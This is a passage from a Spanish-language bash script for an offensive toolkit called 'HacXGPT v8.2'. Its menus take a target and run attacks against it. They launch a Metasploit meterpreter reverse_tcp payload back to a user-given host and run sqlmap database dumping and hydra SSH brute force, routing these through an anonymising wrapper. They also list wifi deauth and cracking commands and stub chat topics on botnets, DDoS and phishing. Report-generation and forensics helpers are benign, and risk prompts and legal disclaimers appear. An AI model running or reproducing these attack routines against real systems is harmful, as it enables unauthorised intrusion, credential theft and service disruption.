            1)
                echo ""
                echo -e "${YELLOW}🔍 METASPLOIT FRAMEWORK — Resource Script${NC}"
                echo ""
                if check_command msfconsole; then
                    read -p "🎯 Módulo MSF [exploit/multi/handler]: " msf_module
                    msf_module="${msf_module:-exploit/multi/handler}"
                    read -p "💣 Payload [windows/meterpreter/reverse_tcp]: " msf_payload
                    msf_payload="${msf_payload:-windows/meterpreter/reverse_tcp}"
                    read -p "🌐 RHOSTS/objetivo [${TARGET:-192.168.1.1}]: " msf_rhosts
                    msf_rhosts="${msf_rhosts:-${TARGET:-192.168.1.1}}"
                    read -p "🖥️  LHOST (tu IP): " msf_lhost
                    read -p "🔌 LPORT [4444]: " msf_lport
                    msf_lport="${msf_lport:-4444}"
                    echo ""
                    if confirm_risk "Metasploit Framework" "ALTO" "$msf_rhosts"; then
                        local rc_file="/tmp/hacxgpt_msf_$$.rc"
                        cat > "$rc_file" << MSFEOF
use $msf_module
set RHOSTS $msf_rhosts
set PAYLOAD $msf_payload
set LHOST $msf_lhost
set LPORT $msf_lport
run
exit
MSFEOF
                        echo ""
                        echo -e "${YELLOW}▶️  Ejecutando: msfconsole -q -r $rc_file${NC}"
                        echo ""
                        output=$(msfconsole -q -r "$rc_file" 2>&1)
                        echo "$output"
                        rm -f "$rc_file"
                        save_output "[METASPLOIT $msf_rhosts | $msf_module]\n$output"
                        type track_technique &>/dev/null && track_technique "T1210" "Exploitation of Remote Services (Metasploit)"
                    fi
                fi
                ;;
            2)
                read -p "🌐 URL para sqlmap (ej: http://sitio.com?id=1): " url
                if [ -n "$url" ]; then
                    if confirm_risk "SQL Injection (sqlmap)" "ALTO" "$url"; then
                        if check_command sqlmap; then
                            echo ""
                            echo -e "${YELLOW}🔍 Ejecutando: sqlmap -u \"$url\" --batch --dbs${NC}"
                            echo ""
                            output=$(anon_exec "sqlmap -u '$url' --batch --dbs" 2>&1)
                            echo "$output"
                            save_output "[SQLMAP $url]\n$output"
                            type track_technique &>/dev/null && track_technique "T1190" "Exploit Public-Facing Application (SQLi)"
                        else
                            echo ""
                            echo -e "${YELLOW}💡 Para instalar sqlmap:${NC} sudo apt install sqlmap  (o pip install sqlmap)"
                        fi
                    fi
                fi
                ;;
            3)
                read -p "🎯 Objetivo para fuerza bruta (ej: ssh://${TARGET:-192.168.1.1}): " objetivo
                objetivo="${objetivo:-ssh://$TARGET}"
                if [ -n "$objetivo" ]; then
                    if confirm_risk "Fuerza Bruta (hydra)" "ALTO" "$objetivo"; then
                        if check_command hydra; then
                            read -p "👤 Usuario [default: admin]: " user_val
                            user_val="${user_val:-admin}"
                            read -p "📖 Ruta a Wordlist [default: /usr/share/wordlists/rockyou.txt]: " wl_val
                            wl_val="${wl_val:-/usr/share/wordlists/rockyou.txt}"
                            echo ""
                            echo -e "${YELLOW}🔍 Ejecutando: hydra -l $user_val -P $wl_val $objetivo${NC}"
                            echo ""
                            output=$(anon_exec "hydra -l '$user_val' -P '$wl_val' '$objetivo'" 2>&1)
                            echo "$output"
                            save_output "[HYDRA $objetivo]\n$output"
                            type track_technique &>/dev/null && track_technique "T1110" "Brute Force (Hydra)"
                        else
                            echo ""
                            echo -e "${YELLOW}💡 Para instalar hydra:${NC} sudo apt install hydra"
                        fi
                    fi
                fi
                ;;
            4)
                read -p "🌐 URL para XSS testing (ej: http://sitio.com?q=test): " url
                if [ -n "$url" ]; then
                    if confirm_risk "XSS Testing (XSStrike)" "MEDIO" "$url"; then
                        xsstrike_cmd=""
                        if command -v xsstrike &>/dev/null; then
                            xsstrike_cmd="xsstrike"
                        elif command -v xsstrike.py &>/dev/null; then
                            xsstrike_cmd="xsstrike.py"
                        elif [ -f "xsstrike.py" ]; then
                            xsstrike_cmd="python3 xsstrike.py"
                        fi

                        if [ -n "$xsstrike_cmd" ]; then
                            echo ""
                            echo -e "${YELLOW}🔍 Ejecutando: $xsstrike_cmd -u \"$url\"${NC}"
                            echo ""
                            output=$($xsstrike_cmd -u "$url" 2>&1)
                            echo "$output"
                            save_output "[XSSTRIKE $url]\n$output"
                            type track_technique &>/dev/null && track_technique "T1059.007" "JavaScript XSS Testing (XSStrike)"
                        else
                            echo -e "${RED}❌ XSStrike no está instalado.${NC}"
                            echo -e "${YELLOW}💡 Para instalar XSStrike:${NC} git clone https://github.com/s0md3v/XSStrike.git && cd XSStrike && pip install -r requirements.txt"
                        fi
                    fi
                fi
                ;;
            5)
                echo ""
                echo -e "${YELLOW}🔍 WIFI HACKING COMANDOS:${NC}"
                echo ""
                if command -v aircrack-ng &>/dev/null; then
                    echo -e "${GREEN}✅ aircrack-ng detectado en el sistema.${NC}"
                else
                    echo -e "${YELLOW}💡 Para instalar suite aircrack-ng:${NC} sudo apt install aircrack-ng"
                fi
                echo "• Ver interfaces: airmon-ng"
                echo "• Modo monitor: airmon-ng start wlan0"
                echo "• Capturar handshake: airodump-ng wlan0mon"
                echo "• Ataque deauth: aireplay-ng --deauth 10 -a [BSSID] wlan0mon"
                echo "• Crackear: aircrack-ng -w rockyou.txt captura-01.cap"
                ;;
            6)
                read -p "🔑 Archivo hash para John: " archivo_hash
                if [ -n "$archivo_hash" ]; then
                    if confirm_risk "John The Ripper (Hash Cracking)" "MEDIO" "$archivo_hash"; then
                        if check_command john; then
                            read -p "📖 Ruta a Wordlist [default: /usr/share/wordlists/rockyou.txt]: " wl_val
                            wl_val="${wl_val:-/usr/share/wordlists/rockyou.txt}"
                            echo ""
                            echo -e "${YELLOW}🔍 Ejecutando: john --wordlist=$wl_val $archivo_hash${NC}"
                            echo ""
                            output=$(john --wordlist="$wl_val" "$archivo_hash" 2>&1)
                            echo "$output"
                            save_output "[JOHN $archivo_hash]\n$output"
                            type track_technique &>/dev/null && track_technique "T1110.002" "Password Cracking (John the Ripper)"
                        else
                            echo ""
                            echo -e "${YELLOW}💡 Para instalar John The Ripper:${NC} sudo apt install john"
                        fi
                    fi
                fi
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 5. GENERAR REPORTES (CON DATOS REALES)
# ============================================
generar_reportes() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║           ${GREEN}📊 GENERAR REPORTES DE SESIÓN${CYAN}         ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}📝 REPORTES DINÁMICOS CON DATOS REALES (TARGET: ${CYAN}${TARGET:-NO DEFINIDO}${GREEN}):${NC}"
        echo ""
        echo "1. Generar reporte HTML de sesión actual"
        echo "2. Generar reporte en Texto plano (.txt)"
        echo "3. Generar reporte PDF (vía wkhtmltopdf)"
        echo "4. Ver resumen de evidencias y técnicas en pantalla"
        echo "5. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-5]: " opcion
        
        case $opcion in
            1|2|3)
                local default_name="reporte_${TARGET:-sesion}_$(date +%Y%m%d_%H%M%S)"
                read -p "📄 Nombre base del reporte [default: $default_name]: " nombre
                nombre="${nombre:-$default_name}"
                nombre="${nombre%.*}"

                # Recopilar técnicas ejecutadas desde /tmp/hacx_techniques.json
                local tecs_json="[]"
                if [ -f /tmp/hacx_techniques.json ]; then
                    tecs_json=$(cat /tmp/hacx_techniques.json 2>/dev/null || echo '{"executed": []}')
                fi

                # Recopilar logs guardados
                local log_data=""
                if [ -n "$OUTPUT_FILE" ] && [ -f "$OUTPUT_FILE" ]; then
                    log_data=$(cat "$OUTPUT_FILE")
                fi

                if [ "$opcion" -eq 1 ] || [ "$opcion" -eq 3 ]; then
                    echo ""
                    echo -e "${YELLOW}📝 Generando reporte HTML real...${NC}"
                    python3 -c "
import json, html, os, sys

target = '''${TARGET:-NO DEFINIDO}'''
log_file = '''${OUTPUT_FILE:-}'''
output_html = '''${nombre}.html'''

# Cargar técnicas
executed = []
if os.path.exists('/tmp/hacx_techniques.json'):
    try:
        with open('/tmp/hacx_techniques.json', 'r') as f:
            data = json.load(f)
            executed = data.get('executed', [])
    except Exception as e:
        pass

# Cargar logs de save_output
log_content = ''
if log_file and os.path.exists(log_file):
    try:
        with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
            log_content = f.read()
    except Exception as e:
        log_content = str(e)

html_doc = f'''<!DOCTYPE html>
<html lang=\"es\">
<head>
    <meta charset=\"UTF-8\">
    <title>Reporte de Evaluación de Seguridad - {html.escape(target)}</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 30px; }}
        .container {{ max-width: 1000px; margin: 0 auto; background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #334155; }}
        h1 {{ color: #38bdf8; border-bottom: 2px solid #38bdf8; padding-bottom: 10px; margin-top: 0; }}
        h2 {{ color: #a855f7; margin-top: 25px; border-left: 4px solid #a855f7; padding-left: 10px; }}
        .meta-box {{ background: #0f172a; padding: 15px; border-radius: 8px; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; border: 1px solid #334155; margin-bottom: 25px; }}
        .meta-item {{ font-size: 14px; }}
        .meta-item strong {{ color: #94a3b8; display: block; font-size: 12px; text-transform: uppercase; }}
        .meta-item span {{ color: #f1f5f9; font-weight: bold; font-size: 16px; }}
        .tech-table {{ width: 100%; border-collapse: collapse; margin-top: 15px; }}
        .tech-table th, .tech-table td {{ padding: 12px; text-align: left; border-bottom: 1px solid #334155; }}
        .tech-table th {{ background: #0f172a; color: #38bdf8; }}
        .badge {{ background: #10b981; color: #047857; padding: 3px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; background: #d1fae5; }}
        .log-box {{ background: #090d16; color: #38bdf8; font-family: 'Courier New', Courier, monospace; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; font-size: 13px; border: 1px solid #1e293b; max-height: 500px; }}
        .footer {{ margin-top: 40px; text-align: center; color: #64748b; font-size: 12px; border-top: 1px solid #334155; padding-top: 15px; }}
    </style>
</head>
<body>
    <div class=\"container\">
        <h1>🛡️ Reporte Técnico de Ciberseguridad - HacXGPT v8.2</h1>
        
        <div class=\"meta-box\">
            <div class=\"meta-item\">
                <strong>Objetivo Evaludado</strong>
                <span>{html.escape(target)}</span>
            </div>
            <div class=\"meta-item\">
                <strong>Fecha del Reporte</strong>
                <span>{html.escape('$(date "+%Y-%m-%d %H:%M:%S")')}</span>
            </div>
            <div class=\"meta-item\">
                <strong>Técnicas Registradas</strong>
                <span>{len(executed)}</span>
            </div>
            <div class=\"meta-item\">
                <strong>Log de Sesión</strong>
                <span>{'Activo (' + str(len(log_content)) + ' bytes)' if log_content else 'Sin logs guardados'}</span>
            </div>
        </div>

        <h2>🎯 Técnicas MITRE ATT&CK Ejecutadas</h2>
'''

if executed:
    html_doc += '''<table class=\"tech-table\">
            <thead>
                <tr>
                    <th>ID Técnica</th>
                    <th>Nombre de Técnica / Módulo</th>
                    <th>Timestamp</th>
                </tr>
            </thead>
            <tbody>'''
    for t in executed:
        html_doc += f'''
                <tr>
                    <td><b style=\"color:#38bdf8;\">{html.escape(t.get('id', ''))}</b></td>
                    <td>{html.escape(t.get('name', ''))}</td>
                    <td><span class=\"badge\">{html.escape(t.get('timestamp', ''))}</span></td>
                </tr>'''
    html_doc += '''
            </tbody>
        </table>'''
else:
    html_doc += '''<p style=\"color:#94a3b8; font-style: italic;\">No se han registrado técnicas en esta sesión aún.</p>'''

html_doc += f'''
        <h2>📋 Evidencias & Salidas de Comandos Reales (save_output)</h2>
        {'<div class=\"log-box\">' + html.escape(log_content) + '</div>' if log_content else '<p style=\"color:#94a3b8; font-style: italic;\">No hay evidencia guardada. Recordá activar el guardado presionado <b>S</b> en el menú principal.</p>'}

        <div class=\"footer\">
            Generado automáticamente por HacXGPT v8.2 — MITRE ATT&CK Framework Edition
        </div>
    </div>
</body>
</html>'''

with open(output_html, 'w', encoding='utf-8') as f:
    f.write(html_doc)

print(f'✅ Reporte HTML generado: {output_html}')
"
                    echo -e "${GREEN}✅ Reporte HTML generado exitosamente: ${nombre}.html${NC}"

                    if [ "$opcion" -eq 3 ]; then
                        if check_command wkhtmltopdf "sudo apt install wkhtmltopdf"; then
                            echo -e "${YELLOW}🔄 Convirtiendo a PDF vía wkhtmltopdf...${NC}"
                            wkhtmltopdf "${nombre}.html" "${nombre}.pdf" &>/dev/null
                            echo -e "${GREEN}✅ PDF creado exitosamente: ${nombre}.pdf${NC}"
                        fi
                    fi
                fi

                if [ "$opcion" -eq 2 ]; then
                    echo ""
                    echo -e "${YELLOW}📝 Generando reporte de Texto plano con datos reales...${NC}"
                    {
                        echo "================================================================================"
                        echo "              REPORTE TÉCNICO DE CIBERSEGURIDAD — HACXGPT v8.2"
                        echo "================================================================================"
                        echo "Fecha: $(date)"
                        echo "Objetivo ($TARGET): ${TARGET:-NO DEFINIDO}"
                        echo "Archivo de Log: ${OUTPUT_FILE:-Ninguno}"
                        echo "================================================================================"
                        echo ""
                        echo "🎯 TÉCNICAS MITRE ATT&CK REGISTRADAS EN LA SESIÓN:"
                        echo "--------------------------------------------------------------------------------"
                        if [ -f /tmp/hacx_techniques.json ]; then
                            python3 -c "
import json
with open('/tmp/hacx_techniques.json') as f:
    data = json.load(f)
for t in data.get('executed', []):
    print(f\"  • [{t['id']}] {t['name']} (Hora: {t.get('timestamp', 'N/A')})\")
" 2>/dev/null || echo "  (Sin técnicas registradas)"
                        else
                            echo "  (Sin técnicas registradas)"
                        fi
                        echo ""
                        echo "📋 EVIDENCIAS Y SALIDAS DE COMANDOS REGISTRADAS (save_output):"
                        echo "--------------------------------------------------------------------------------"
                        if [ -n "$OUTPUT_FILE" ] && [ -f "$OUTPUT_FILE" ]; then
                            cat "$OUTPUT_FILE"
                        else
                            echo "  (Sin logs guardados en esta sesión. Activa el guardado con 'S' en el menú principal)"
                        fi
                        echo ""
                        echo "================================================================================"
                        echo "              Fin del Reporte — HacXGPT Framework"
                        echo "================================================================================"
                    } > "${nombre}.txt"
                    echo -e "${GREEN}✅ Reporte de texto creado: ${nombre}.txt${NC}"
                fi
                ;;
            4)
                echo ""
                echo -e "${CYAN}📊 RESUMEN DE EVIDENCIAS Y TELEMETRÍA EN PANTALLA:${NC}"
                echo -e "${YELLOW}🎯 Objetivo:${NC} ${TARGET:-NO DEFINIDO}"
                echo -e "${YELLOW}📁 Archivo log actual:${NC} ${OUTPUT_FILE:-Desactivado}"
                echo ""
                echo -e "${GREEN}✅ Técnicas MITRE Ejecutadas (/tmp/hacx_techniques.json):${NC}"
                if [ -f /tmp/hacx_techniques.json ]; then
                    python3 -c "
import json
with open('/tmp/hacx_techniques.json') as f:
    data = json.load(f)
for t in data.get('executed', []):
    print(f\"   🟢 {t['id']} - {t['name']} ({t.get('timestamp', '')})\")
" 2>/dev/null
                else
                    echo "   (Ninguna técnica registrada aún)"
                fi
                echo ""
                echo -e "${GREEN}📋 Últimas 15 líneas del Log de Sesión:${NC}"
                if [ -n "$OUTPUT_FILE" ] && [ -f "$OUTPUT_FILE" ]; then
                    echo -e "${BLUE}--------------------------------------------------${NC}"
                    tail -n 15 "$OUTPUT_FILE"
                    echo -e "${BLUE}--------------------------------------------------${NC}"
                else
                    echo "   (No hay archivo log activo de sesión)"
                fi
                ;;
            5)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 6. HERRAMIENTAS AVANZADAS (IMPLEMENTADO)
# ============================================
herramientas_avanzadas() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║          ${GREEN}🔧 HERRAMIENTAS AVANZADAS${CYAN}           ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}⚙️ HERRAMIENTAS ESPECIALIZADAS:${NC}"
        echo ""
        echo "1. Análisis de malware"
        echo "2. Ingeniería inversa"
        echo "3. Forense digital"
        echo "4. OSINT (Inteligencia abierta)"
        echo "5. Automatización de tareas"
        echo "6. Desarrollo de exploits"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                echo ""
                echo -e "${YELLOW}🦠 ANÁLISIS DE MALWARE:${NC}"
                echo ""
                read -p "📁 Ruta del archivo a analizar: " mal_file
                if [ -z "$mal_file" ] || [ ! -f "$mal_file" ]; then
                    echo -e "${RED}❌ Archivo no encontrado: $mal_file${NC}"
                else
                    local output=""
                    echo ""
                    if check_command strings; then
                        echo -e "${CYAN}▶ Strings analysis...${NC}"
                        output=$(strings "$mal_file" 2>&1 | head -50)
                        echo "$output"
                        save_output "[STRINGS $mal_file]\n$output"
                    fi
                    if check_command yara; then
                        echo -e "${CYAN}▶ YARA scan...${NC}"
                        local yara_out=$(yara -r /usr/share/yara/ "$mal_file" 2>&1 || echo "No hay reglas YARA en /usr/share/yara/ o no se encontraron coincidencias")
                        echo "$yara_out"
                        save_output "[YARA $mal_file]\n$yara_out"
                    else
                        echo -e "${YELLOW}💡 Instalar YARA: sudo apt install yara${NC}"
                    fi
                    if check_command file; then
                        echo -e "${CYAN}▶ Tipo de archivo:${NC}"
                        file "$mal_file"
                    fi
                    type track_technique &>/dev/null && track_technique "T1204" "User Execution / Malware Analysis"
                fi
                ;;
            2)
                echo ""
                echo -e "${YELLOW}🔬 INGENIERÍA INVERSA:${NC}"
                echo ""
                read -p "📁 Ruta del binario a analizar: " bin_file
                if [ -z "$bin_file" ] || [ ! -f "$bin_file" ]; then
                    echo -e "${RED}❌ Archivo no encontrado: $bin_file${NC}"
                else
                    local output=""
                    echo ""
                    if check_command objdump; then
                        echo -e "${CYAN}▶ Desensamblando con objdump...${NC}"
                        output=$(objdump -d "$bin_file" 2>&1 | head -80)
                        echo "$output"
                        save_output "[OBJDUMP $bin_file]\n$output"
                    fi
                    if check_command binwalk; then
                        echo -e "${CYAN}▶ binwalk analysis...${NC}"
                        local bw_out=$(binwalk "$bin_file" 2>&1)
                        echo "$bw_out"
                        save_output "[BINWALK $bin_file]\n$bw_out"
                    else
                        echo -e "${YELLOW}💡 Instalar binwalk: sudo apt install binwalk${NC}"
                    fi
                    if check_command radare2; then
                        echo -e "${CYAN}▶ radare2 info...${NC}"
                        local r2_out=$(radare2 -A -q -c "iI" "$bin_file" 2>&1)
                        echo "$r2_out"
                        save_output "[RADARE2 $bin_file]\n$r2_out"
                    else
                        echo -e "${YELLOW}💡 Instalar radare2: sudo apt install radare2${NC}"
                    fi
                    type track_technique &>/dev/null && track_technique "T1059" "Command and Scripting Interpreter / RE"
                fi
                ;;
            3)
                echo ""
                echo -e "${YELLOW}🔍 FORENSE DIGITAL:${NC}"
                echo ""
                echo "1) Analizar imagen de disco"
                echo "2) Analizar dump de memoria"
                echo "3) Recuperar archivos eliminados"
                read -p "🎯 Selecciona [1-3]: " for_opcion
                case $for_opcion in
                    1)
                        read -p "📁 Ruta de la imagen de disco (.dd/.img): " disk_img
                        if [ -f "$disk_img" ]; then
                            if check_command file; then file "$disk_img"; fi
                            if check_command strings; then
                                echo -e "${CYAN}▶ Extrayendo strings de la imagen...${NC}"
                                local out=$(strings "$disk_img" 2>&1 | grep -E "(password|user|admin|secret|key)" | head -30)
                                echo "$out"
                                save_output "[DISK FORENSICS $disk_img]\n$out"
                            fi
                        else
                            echo -e "${RED}❌ Imagen no encontrada${NC}"
                        fi
                        ;;
                    2)
                        read -p "📁 Ruta del memory dump: " mem_dump
                        if [ -f "$mem_dump" ]; then
                            if check_command volatility3; then
                                echo -e "${CYAN}▶ volatility3 imageinfo...${NC}"
                                local vol_out=$(volatility3 -f "$mem_dump" windows.info 2>&1 | head -30)
                                echo "$vol_out"
                                save_output "[VOLATILITY $mem_dump]\n$vol_out"
                            elif check_command vol; then
                                local vol_out=$(vol -f "$mem_dump" windows.info 2>&1 | head -30)
                                echo "$vol_out"
                                save_output "[VOLATILITY $mem_dump]\n$vol_out"
                            else
                                echo -e "${YELLOW}💡 Instalar: pip install volatility3 --break-system-packages${NC}"
                            fi
                        else
                            echo -e "${RED}❌ Dump no encontrado${NC}"
                        fi
                        ;;
                    3)
                        read -p "📁 Dispositivo o imagen a recuperar (ej: /dev/sdb o imagen.dd): " rec_dev
                        if check_command photorec; then
                            echo -e "${CYAN}▶ Lanzando photorec...${NC}"
                            photorec "$rec_dev"
                        else
                            echo -e "${YELLOW}💡 Instalar: sudo apt install testdisk${NC}"
                        fi
                        ;;
                esac
                type track_technique &>/dev/null && track_technique "T1005" "Data from Local System / Forensics"
                ;;
            4)
                read -p "🌐 Objetivo para recon OSINT (Dominio/IP) [default: ${TARGET:-ejemplo.com}]: " target_osint
                target_osint="${target_osint:-$TARGET}"
                if [ -n "$target_osint" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando reconocimiento OSINT contra $target_osint...${NC}"
                    echo ""
                    local output=""
                    
                    if check_command "recon-ng" "sudo apt install recon-ng"; then
                        echo -e "${CYAN}▶ Lanzando recon-ng en modo batch...${NC}"
                        output=$(anon_exec "recon-ng -m hackertarget -c 'options set SOURCE $target_osint; run; exit'" 2>&1)
                        echo "$output"
                        save_output "[RECON-NG $target_osint]\n$output"
                        type track_technique &>/dev/null && track_technique "T1593" "Search Open Technical Databases (recon-ng)"
                    elif command -v theHarvester &>/dev/null; then
                        echo -e "${YELLOW}ℹ️ recon-ng no disponible, usando theHarvester como fallback...${NC}"
                        echo -e "${CYAN}▶ Ejecutando theHarvester...${NC}"
                        output=$(anon_exec "theHarvester -d '$target_osint' -b google,bing" 2>&1)
                        echo "$output"
                        save_output "[THEHARVESTER OSINT $target_osint]\n$output"
                        type track_technique &>/dev/null && track_technique "T1589" "Gather Victim Identity Information (theHarvester)"
                    else
                        echo -e "${YELLOW}💡 Sugerencia de instalación:${NC} sudo apt install recon-ng  (o sudo apt install theharvester)"
                    fi
                fi
                ;;
            5)
                echo ""
                echo -e "${YELLOW}🤖 AUTOMATIZACIÓN:${NC}"
                echo ""
                echo "• Scripting: bash, python, powershell"
                echo "• Automatización: ansible, chef, puppet"
                echo "• Orchestration: terraform"
                echo "• CI/CD: Jenkins, GitLab CI"
                echo "• Containers: Docker, Kubernetes"
                ;;
            6)
                echo ""
                echo -e "${YELLOW}💣 DESARROLLO DE EXPLOITS:${NC}"
                echo ""
                echo "• Pattern creation: msf-pattern_create"
                echo "• Offset calculation: msf-pattern_offset"
                echo "• Shellcode generation: msfvenom"
                echo "• Debugging: Immunity Debugger, x64dbg"
                echo "• Fuzzing: AFL, boofuzz"
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 7. CHAT LIBRE (YA IMPLEMENTADO)
# ============================================
chat_libre() {
    # ============================================
    # MEJORA 5: Chat con arrays asociativos
    # ============================================
    
    # Función para renderizar contenido CHAT_DATA en formato Purple Team
    _show_chat_topic() {
        local topic="$1"
        local title="$2"
        local pdata="${CHAT_DATA[$topic]}"
        
        if [[ -z "$pdata" ]]; then
            echo -e "${YELLOW}ℹ️  No hay datos estructurados para este tema.${NC}"
            return 1
        fi
        
        echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
        echo -e "${PURPLE}║  CHAT EXPERTO — ${CYAN}$title${NC}"
        echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
        echo -e "📊 Contexto aplicado contra: ${CYAN}${CHAT_TARGET}${NC}"
        echo ""
        
        # Reemplazar CHAT_TARGET
        pdata="${pdata//CHAT_TARGET/$CHAT_TARGET}"
        
        local temp="$pdata"
        local delimiter="|||"
        local secciones=()
        while [[ "$temp" == *"$delimiter"* ]]; do
            secciones+=("${temp%%"$delimiter"*}")
            temp="${temp#*"$delimiter"}"
        done
        secciones+=("$temp")
        
        for seccion in "${secciones[@]}"; do
            seccion="$(echo -e "$seccion" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
            [[ -z "$seccion" ]] && continue
            
            if [[ "$seccion" == *"🔴"* ]]; then
                echo -e "${RED}$seccion${NC}"
            elif [[ "$seccion" == *"🔵"* ]]; then
                echo -e "${BLUE}$seccion${NC}"
            elif [[ "$seccion" == *"🟣"* ]]; then
                echo -e "${PURPLE}$seccion${NC}"
            elif [[ "$seccion" == *"📝"* ]]; then
                echo -e "${YELLOW}$seccion${NC}"
            else
                echo -e "$seccion"
            fi
            echo ""
        done
        return 0
    }

    # Funciones de respuesta para cada tema
    _chat_botnet() {
        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
        _show_chat_topic "botnet" "Botnets y Command & Control (T1078/T1071)"
    }

    _chat_ddos() {
        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
        _show_chat_topic "ddos" "Denegación de Servicio (DDoS)"
    }

    _chat_sql() {
        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
        _show_chat_topic "sql" "Inyección SQL (SQLi)"
    }

    _chat_nmap() {
        echo "🔍 NMAP - ESCANEO PROFESIONAL"
        echo ""
        echo "⚙️ COMANDOS ESENCIALES:"
        echo "- nmap -sS -sV -p- [OBJETIVO]"
        echo "- nmap -sS -T2 [OBJETIVO] (sigiloso)"
        echo "- nmap -A -T4 [OBJETIVO] (agresivo)"
        echo "- nmap -sU [OBJETIVO] (UDP - lento)"
        echo ""
        echo "🎯 TÉCNICAS ESPECIALES:"
        echo "- Fragmentación: nmap -f"
        echo "- Decoys: nmap -D RND:10"
        echo "- Timing: -T0 a -T5"
    }
    _chat_xss() {
        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
        _show_chat_topic "xss" "Cross-Site Scripting XSS (T1059.007)"
    }

    _chat_phishing() {
        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
        _show_chat_topic "phishing" "Phishing e Ingeniería Social (T1566)"
    }

    _chat_hash() {
        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
        _show_chat_topic "hash" "Hash Cracking y Credential Dumping (T1003/T1110)"
    }

    _chat_default() {
        echo -e "${CYAN}ℹ️ No reconozco esa pregunta específica.${NC}"
        echo ""
        echo -e "${GREEN}🎯 Prueba con temas como:${NC}"
        echo -e "  ${YELLOW}•${NC} 'ddos a 10.0.0.1'        ${YELLOW}•${NC} 'sql injection sobre sitio.com'"
        echo -e "  ${YELLOW}•${NC} 'phishing'              ${YELLOW}•${NC} 'kerberoasting'"
        echo -e "  ${YELLOW}•${NC} 'lolbins'               ${YELLOW}•${NC} 'pass the hash'"
        echo -e "  ${YELLOW}•${NC} 'xss'                   ${YELLOW}•${NC} 'botnet'"
        echo -e "  ${YELLOW}•${NC} 'cve'                   ${YELLOW}•${NC} 'apt29 / apt38 / fin7'"
        echo -e "  ${YELLOW}•${NC} 'sabias que'            ${YELLOW}•${NC} 't1003 / t1566 / t1059'"
    }

    # Array asociativo: palabra_clave → función_de_respuesta
    # (requiere bash >= 4.0)
    declare -A chat_dispatch
    chat_dispatch["botnet"]="_chat_botnet"
    chat_dispatch["ddos"]="_chat_ddos"
    chat_dispatch["denegacion"]="_chat_ddos"
    chat_dispatch["sql"]="_chat_sql"
    chat_dispatch["inyeccion"]="_chat_sql"
    chat_dispatch["nmap"]="_chat_nmap"
    chat_dispatch["escaneo"]="_chat_nmap"
    chat_dispatch["xss"]="_chat_xss"
    chat_dispatch["phishing"]="_chat_phishing"
    chat_dispatch["hash"]="_chat_hash"
    chat_dispatch["descifrar"]="_chat_hash"
    chat_dispatch["contraseña"]="_chat_hash"
    # === NUEVOS keywords MITRE / experto ===
    chat_dispatch["cve"]="_chat_cve"
    chat_dispatch["kerberoasting"]="_chat_kerberoasting"
    chat_dispatch["kerb"]="_chat_kerberoasting"
    chat_dispatch["lolbin"]="_chat_lolbins"
    chat_dispatch["lolbins"]="_chat_lolbins"
    chat_dispatch["pass the hash"]="_chat_pth"
    chat_dispatch["pth"]="_chat_pth"
    chat_dispatch["apt29"]="_chat_apt29"
    chat_dispatch["cozy bear"]="_chat_apt29"
    chat_dispatch["apt38"]="_chat_apt38"
    chat_dispatch["lazarus"]="_chat_apt38"
    chat_dispatch["fin7"]="_chat_fin7"
    chat_dispatch["carbanak"]="_chat_fin7"
    chat_dispatch["sabias que"]="_chat_trivia"
    chat_dispatch["sabias"]="_chat_trivia"
    chat_dispatch["t1003"]="_chat_mitre_t1003"
    chat_dispatch["t1566"]="_chat_mitre_t1566"
    chat_dispatch["t1059"]="_chat_mitre_t1059"
    chat_dispatch["t1055"]="_chat_mitre_t1055"

    # Funciones de respuesta para nuevos temas
    _chat_cve() {
        _show_chat_topic "cve" "Top CVEs 2024-2025"
    }

    _chat_kerberoasting() {
        echo -e "${YELLOW}⚠️  ADVERTENCIA LEGAL: Información provista estrictamente con fines educativos y de auditoría autorizada.${NC}"
        _show_chat_topic "kerberoasting" "Kerberoasting (T1558.003)"
    }

    _chat_lolbins() {
